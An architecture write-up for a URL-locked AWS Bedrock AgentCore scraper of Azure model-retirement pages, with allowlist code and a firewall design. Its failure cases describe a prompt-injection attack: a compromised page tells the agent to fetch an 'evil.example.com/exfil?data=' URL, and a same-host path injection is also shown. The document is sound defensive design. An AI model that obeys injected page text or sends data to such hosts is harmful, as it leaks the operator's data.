# Model-Retirement Scraper on AWS Bedrock AgentCore

A URL-locked, scheduled agent that scrapes **only** the Azure/Bedrock model-retirement
pages on `learn.microsoft.com`, parses them, enriches your model report, and writes the
result to S3. The agent is physically prevented from reaching any other host.

> **The core security idea:** a system prompt saying "only scrape these URLs" is **not**
> a control. A compromised page could try to redirect the agent. The URL restriction is
> enforced in **two independent layers**, neither of which the model can talk its way past:
>
> - **Layer 2 (tool code):** the one tool the agent has hardcodes the allowed host and
>   rejects anything else.
> - **Layer 1 (network):** the subnet's egress firewall drops any packet not destined for
>   `learn.microsoft.com`, regardless of what the code or the model does.

---

## 1. Components — what each one is and how it works individually

### EventBridge Scheduler
**What it is:** AWS's managed cron/timer service (the newer, cheaper successor to
EventBridge Rules for scheduled invokes).
**How it works on its own:** you give it a cron or rate expression and a target ARN. At
each fire time it calls the target once, passing a fixed JSON payload. It has an
at-least-once delivery guarantee, a built-in retry policy, and a dead-letter queue option.
It holds no business logic — it is purely "call this ARN at this time."
**Here:** `cron(0 6 * * ? *)` → fires daily at 06:00 UTC → invokes the AgentCore Runtime
with `{"task": "refresh model retirement dates"}`.

### Bedrock AgentCore Runtime
**What it is:** the managed host that runs the agent — the Claude model plus the system
prompt and the agent loop (model decides → calls a tool → reads the result → decides again).
**How it works on its own:** it receives an input event, runs the model with the configured
prompt and the list of tools the Gateway exposes, and executes the model's tool calls by
dispatching them through the Gateway. It returns a final response when the model stops
calling tools. It is stateless between invocations unless you wire in memory.
**Here:** reads the task, decides to call `fetch_retirement_page`, then (after the tool
returns parsed data) runs the enrich/merge step and the S3 write. The prompt tells it which
two URLs are legitimate — but that instruction is **guidance, not enforcement** (see Layers).

### AgentCore Gateway
**What it is:** the layer that turns your backends (a Lambda, an API, an MCP server) into
**tools** the agent can call, and controls exactly which tools the runtime sees.
**How it works on its own:** you register tool definitions (name, schema, backend target).
The runtime can only call tools registered here — it has no generic "make HTTP request"
primitive. This is the choke point for *what verbs the agent even has*.
**Here:** registers **exactly one** tool — `fetch_retirement_page(url)` → backed by the
Lambda. The agent literally has no other action available. No web-browse tool, no code
interpreter with network, nothing.

### AWS Lambda — the fetcher tool (Enforcement Layer 2)
**What it is:** the serverless function that implements the one tool.
**How it works on its own:** triggered with an event (the tool-call arguments), runs your
code, returns a result. Runs inside the VPC private subnet, so its only way to the internet
is via the subnet's route table → NAT → firewall.
**Here, it does three things in order:**
1. **Exact-URL allowlist (L2):** the `url` argument is normalized and compared against a
   frozen set of the **two exact pages** — not just the host. Anything else (another path on
   `learn.microsoft.com` included) is rejected before a single packet leaves. See the code
   in §2.1.
2. **Fetch + parse:** `GET` the page, run the BeautifulSoup table parser
   (`_azure_scrape` from `model_lifecycle.py`).
3. **Enrich + write:** read the current `aggregated_report.csv` from S3, run
   `enrich(df, "azure", ...)`, write `enriched_aggregated_report.csv` back to S3.

### VPC private subnet
**What it is:** a network segment with **no route to an internet gateway**.
**How it works on its own:** resources in it cannot reach the public internet directly;
the route table sends `0.0.0.0/0` to a NAT Gateway instead of an IGW. This is what makes
the firewall unavoidable — there is no second door.
**Here:** both the Runtime and the Lambda live here. Every outbound packet is forced through
the NAT → Network Firewall path.

### NAT Gateway
**What it is:** managed network address translation — the single outbound door for a private
subnet.
**How it works on its own:** it accepts outbound traffic from the private subnet and
forwards it, translating source addresses. It cannot *initiate* inbound connections. All
egress funnels through it.
**Here:** the only `0.0.0.0/0` target in the route table, so it is the single point every
outbound request must pass through before the firewall inspects it.

### AWS Network Firewall (Enforcement Layer 1)
**What it is:** a managed, stateful network firewall that inspects traffic at the VPC edge.
**How it works on its own:** you attach **stateful rule groups**. For HTTPS it can filter on
the **TLS SNI** (the server name sent in the TLS handshake, visible before encryption). A
domain-allowlist rule group permits only listed FQDNs and drops everything else, logging the
denies.
**Here:** the allowlist contains exactly `learn.microsoft.com`. A request to any other host
is dropped at the network and written to the deny log — **even if the Lambda host check were
buggy or bypassed.** This is the backstop that makes the lock real.

### S3 bucket
**What it is:** object storage.
**How it works on its own:** stores versioned objects; server-side encryption; access gated
by IAM/bucket policy.
**Here:** holds the input `aggregated_report.csv` and the output
`enriched_aggregated_report.csv`. Versioning on, so each run keeps the prior file.

### CloudWatch Logs
**What it is:** the logging/metrics service.
**How it works on its own:** collects log streams from Lambda, the Runtime, and the Network
Firewall; you query and alarm on them.
**Here:** the run log (rows matched, file written) **and** the firewall deny log — your
auditable proof that nothing but `learn.microsoft.com` was ever reached.

### IAM execution roles
**What it is:** the identity/permission layer.
**How it works on its own:** each service assumes a role granting only the specific API
actions it needs.
**Here:**
- Runtime role: invoke the Gateway tool, write to the S3 prefix.
- Lambda role: write to S3, write logs.
Least-privilege; no broad network or `s3:*` permissions.

### Secrets Manager — *not required*
Listed only to close the loop: there are **no credentials** in this design because the
retirement pages are public. If you later scrape an authenticated source, the key would live
here and be fetched at runtime — never hardcoded.

---

## 2. The two enforcement layers (why the lock actually holds)

| | Layer 2 — tool code | Layer 1 — network |
|---|---|---|
| **Where** | Lambda fetcher | AWS Network Firewall |
| **Mechanism** | **exact-URL allowlist** (2 normalized strings) | TLS-SNI FQDN allowlist |
| **Granularity** | the two **exact pages** (host + path) | the **host** `learn.microsoft.com` |
| **Stops** | the agent *forming* a bad call | the packet *leaving* the VPC |
| **If it fails** | Layer 1 still drops the packet | (there is no deeper layer — this is the backstop) |

Note the deliberate asymmetry: **L2 is tighter than L1.** The firewall can only filter on
the TLS SNI, which carries the *host*, not the path — so at the network it is
`learn.microsoft.com` or nothing. The exact-page restriction therefore *must* live in the
tool code, where the full URL is visible. L1 is the backstop for "wrong host"; L2 is the
only thing that enforces "wrong *page* on the right host."

The system prompt ("only use these two URLs") is a **third, non-security** layer — helpful
for steering the model, worthless as a control. Treat it as UX, not defense.

### 2.1 The exact-URL allowlist (Layer 2 implementation)

```python
from urllib.parse import urlsplit, urlunsplit

# The ONLY two pages this tool may ever fetch. Frozen set of exact,
# already-normalized URLs — host AND path, no query, no fragment.
_ALLOWED_URLS = frozenset({
    "https://learn.microsoft.com/en-us/azure/ai-foundry/openai/concepts/model-retirements",
    "https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/model-retirements",
})


def _normalize(url: str) -> str:
    """
    Canonicalize so cosmetic variants can't slip past the string match:
      - scheme/host lowercased
      - strip any query string and fragment
      - strip a single trailing slash on the path
    Anything the normalizer can't make sense of raises.
    """
    parts = urlsplit(url.strip())
    if parts.scheme != "https":
        raise ValueError(f"non-https URL rejected: {url!r}")
    host = parts.netloc.lower()
    path = parts.path.rstrip("/")
    return urlunsplit(("https", host, path, "", ""))   # drops query + fragment


def _assert_allowed(url: str) -> str:
    norm = _normalize(url)
    if norm not in _ALLOWED_URLS:
        raise PermissionError(f"URL not in allowlist, refusing to fetch: {url!r}")
    return norm


def fetch_retirement_page(url: str) -> dict:
    safe_url = _assert_allowed(url)      # <-- L2: exact-URL gate, before any network I/O
    import requests
    from model_lifecycle import _azure_scrape
    resp = requests.get(safe_url, headers={"User-Agent": "retirement-scraper/1.0"}, timeout=30)
    resp.raise_for_status()
    return _azure_scrape(resp.text)
```

Why each guard matters:
- **`frozenset` of exact strings** — not a host check, not a prefix/`startswith` check. A
  prefix check would let `.../model-retirements/../../secrets` or a look-alike sub-path
  through; exact membership cannot.
- **Drop query + fragment** — `...model-retirements?x=https://evil.com` normalizes to the
  bare page, so an attacker can't smuggle a second URL in a parameter *and* can't use a
  junk query to dodge the match.
- **Force `https` + lowercase host** — kills `HTTP://`, `LEARN.microsoft.com`, and
  scheme-downgrade variants that would otherwise be distinct strings.
- **`rstrip("/")` the path** — the only cosmetic variance we *accept* (trailing slash), so a
  legitimate call isn't rejected on a technicality.
- Raise on anything unparse-able rather than falling through to a default.

---

## 3. End-to-end example — one scheduled run, traced

**Scenario:** the daily fire at **06:00 UTC on 2026-11-05**.

1. **EventBridge Scheduler** fires `cron(0 6 * * ? *)` and invokes the **AgentCore Runtime**
   with `{"task": "refresh model retirement dates"}`.
2. **Runtime** (Claude) reads its prompt and emits a tool call:
   `fetch_retirement_page(url="https://learn.microsoft.com/en-us/azure/ai-foundry/openai/concepts/model-retirements")`.
3. **Gateway** dispatches that call to the **Lambda**.
4. **Lambda, step 1 (L2):** `_assert_allowed(url)` normalizes the URL and finds it in
   `_ALLOWED_URLS` → **passes**. It issues the `GET`.
5. Packet leaves the private subnet → **NAT Gateway** → **Network Firewall**. The firewall
   reads TLS SNI = `learn.microsoft.com` → matches the allowlist → **permit**. The page
   returns.
6. **Lambda, step 2:** runs `_azure_scrape(html)` → e.g.
   `{"gpt-4o": {"deprecation": "", "eol": "2026-03-01"}, "o3-mini": {...}, ...}`.
7. **Lambda, step 3:** reads `aggregated_report.csv` from **S3**, runs
   `enrich(df, "azure", model_id_col="model_id")`, writes
   `enriched_aggregated_report.csv` back to **S3** (new version).
8. **CloudWatch** records: `rows_matched=18/26, wrote s3://.../enriched_aggregated_report.csv`.
9. **Runtime** sees no further tool calls needed → returns success. Done.

### The lock, proven by the failure cases

**Case A — wrong host (exfiltration attempt).** A compromised retirement page contains
hidden text telling the agent to also fetch `https://evil.example.com/exfil?data=...`. The
model obligingly emits `fetch_retirement_page(url="https://evil.example.com/...")`.

- **Step 4 (L2)** fails: `_assert_allowed` normalizes it, finds it absent from
  `_ALLOWED_URLS`, raises `PermissionError`; the tool returns an error. Blocked.
- **Even if** the code check were bypassed, **step 5 (L1)** fails: the firewall sees SNI
  `evil.example.com` ∉ allowlist → **drops the packet** and logs a deny. Blocked.

**Case B — right host, wrong page (this is what the tightening buys you).** The injection is
subtler: `fetch_retirement_page(url="https://learn.microsoft.com/en-us/azure/.../internal-preview-notes")`
— a *different* path on the allowed host, perhaps one that returns attacker-influenced
content or simply isn't what we intend to parse.

- **Step 4 (L2)** fails: the normalized URL isn't one of the two frozen strings →
  `PermissionError`. Blocked.
- **Step 5 (L1) would NOT catch this** — the TLS SNI is `learn.microsoft.com`, which the
  firewall permits. The network layer is blind to path. **Only the exact-URL check in the
  tool code stops Case B.** This is precisely why L2 is tighter than L1, and why the host-only
  check from the first draft was insufficient.

The agent cannot reach any host but one, and cannot reach any page but two. The prompt was
never trusted to enforce either.

---

## 4. Honest trade-off — do you even need the agent?

For scraping **two fixed URLs**, the model earns nothing. The task is deterministic:
`GET` two known pages → parse → enrich → write. Wrapping a model around it adds cost,
latency, and a **prompt-injection surface** (steps 2–4 are exactly where injection enters).

**No-agent variant (recommended unless "must be an agent" is a hard mandate):**

```
EventBridge Scheduler → Lambda (same VPC + NAT + Network Firewall) → S3
```

Same two-layer URL lock, **minus** the AgentCore Runtime and Gateway, minus steps 2–4's
injection vector. Cheaper, simpler, strictly safer. Use the full AgentCore design only if
you will later add genuine reasoning (e.g. "summarize what changed since the last run and
open a ticket") that justifies a model in the loop.
